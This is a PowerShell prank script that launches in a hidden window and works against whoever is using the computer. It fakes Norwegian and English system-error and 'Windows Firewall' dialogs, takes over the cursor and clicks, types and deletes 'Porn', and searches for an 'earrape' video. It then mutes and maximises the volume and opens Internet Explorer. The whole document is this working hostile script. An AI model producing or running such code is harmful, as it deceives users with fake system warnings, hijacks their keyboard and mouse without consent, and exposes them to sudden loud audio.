Powershell.exe -windowstyle hidden {

#Activate Script at a spesific time
$DateTimeNow = Get-Date 
$DateTimeEarly = Get-Date -Hour 9 -Minute 15
#if($DateTimeNow.TimeOfDay -lt $DateTimeEarly.TimeOfDay){
#    "None"
#} else {

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationCore,PresentationFramework
$ButtonType = [System.Windows.MessageBoxButton]::OK
$MessageIcon = [System.Windows.MessageBoxImage]::Hand
$MessageBody = "Oops! Noe gikk galt."
$MessageTitle = "Systemfeil"
$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
$Shell = New-Object -com "Wscript.Shell"
#$Shell.Run("iexplore.exe")
$x = 20
$y = 20
do 
{
	$x++
	[System.Windows.Forms.Cursor]::Position = "$x,20"
	Start-Sleep -m 0.8
}
until ($x -ge 280)
Start-Sleep -m 5
do
{
	$y++
	[System.Windows.Forms.Cursor]::Position = "$x,$y"
	Start-Sleep -m 0.8
}
until ($y -ge 80)
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
[W.U32]::mouse_event(6,0,0,0,0);
$Shell.sendkeys("P")
Start-Sleep -m 200
$Shell.sendkeys("o")
Start-Sleep -m 200
$Shell.sendkeys("r")
Start-Sleep -m 200
$Shell.sendkeys("n")
Start-Sleep -s 2
$Shell.sendkeys("{BACKSPACE}")
Start-Sleep -m 100
$Shell.sendkeys("{BACKSPACE}")
Start-Sleep -m 100
$Shell.sendkeys("{BACKSPACE}")
Start-Sleep -m 100
$Shell.sendkeys("{BACKSPACE}")
Start-Sleep -m 100
$Shell.sendkeys("Monster Inc Earrape")
Start-Sleep -m 100
$Shell.sendkeys("{ENTER}")
Start-Sleep -m 100
do
{
$y++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.5
}
until ($y -ge 650)
do
{
$x++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.5
}
until ($x -ge 700)
$Shell.SendKeys([char]173)
$u = 0
do
{
$u++
$Shell.SendKeys([char]175)
}
until ($u -ge 50)
Start-Sleep -s 1
#[W.U32]::mouse_event(6,0,0,0,0);
Start-Sleep -s 1
do
{
$x++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.5
}
until ($x -ge 1750)
do
{
$y--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
}
until ($y -le 10)
[W.U32]::mouse_event(6,0,0,0,0)
Start-Sleep -s 1
#Loading...
$x = 20
$y = 20
do
{
$x++
[System.Windows.Forms.Cursor]::Position = "$x,20"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($x -ge 1260)
Start-Sleep -m 10
do
{
$y++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($y -ge 700)
Start-Sleep -m 10
do 
{
$x--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($x -le 20)
Start-Sleep -m 10
do
{
$y--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($y -le 20)
Start-Sleep -m 10
do
{
$x++
[System.Windows.Forms.Cursor]::Position = "$x,20"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($x -ge 1260)
Start-Sleep -m 10
do
{
$y++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($y -ge 700)
Start-Sleep -m 10
do 
{
$x--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($x -le 20)
Start-Sleep -m 10
do
{
$y--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($y -le 20)
Start-Sleep -m 10
do
{
$x++
[System.Windows.Forms.Cursor]::Position = "$x,20"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($x -ge 1260)
Start-Sleep -m 10
do
{
$y++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($y -ge 700)
Start-Sleep -m 10
do 
{
$x--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($x -le 20)
Start-Sleep -m 10
do
{
$y--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 0.8
$Shell.SendKeys([char]175)
}
until ($y -le 20)
#Error Messages
$ButtonType = [System.Windows.MessageBoxButton]::OK
$MessageIcon = [System.Windows.MessageBoxImage]::Error
$MessageBody = "Oops! Noe gikk galt."
$MessageTitle = "Systemfeil"
$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
Start-Sleep -s 2
$ButtonType = [System.Windows.MessageBoxButton]::OK
$MessageIcon = [System.Windows.MessageBoxImage]::Warning
$MessageBody = "Critical Error 404"
$MessageTitle = "System error"
$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
Start-Sleep -s 2
$ButtonType = [System.Windows.MessageBoxButton]::OK
$MessageIcon = [System.Windows.MessageBoxImage]::Error
$MessageBody = "Error!"
$MessageTitle = "Systemfeil"
$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
Start-Sleep -s 2
Add-Type -AssemblyName PresentationCore,PresentationFramework
$BT = [System.Windows.MessageBoxButton]::OK
$MI = [System.Windows.MessageBoxImage]::Exclamation
$MB = "Keyboard does not respond. Press any key to continue"
$MT = "Keyboard error"
$Result = [System.Windows.MessageBox]::Show($MB,$MT,$BT,$MI)
Start-Sleep -s 2
$BT = [System.Windows.MessageBoxButton]::OK
$MI = [System.Windows.MessageBoxImage]::Exclamation
$MB = "Chrome is not supported on your system. Use Internet Explorer instead."
$MT = "Windows Firewall"
$Result = [System.Windows.MessageBox]::Show($MB,$MT,$BT,$MI) 
do
{
$x++
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 1
}
until ($x -ge 1255)
do
{
$y--
[System.Windows.Forms.Cursor]::Position = "$x,$y"
Start-Sleep -m 1
}
until ($y -le 13)
[W.U32]::mouse_event(6,0,0,0,0);
$Shell.Run("iexplore.exe")
#}
}

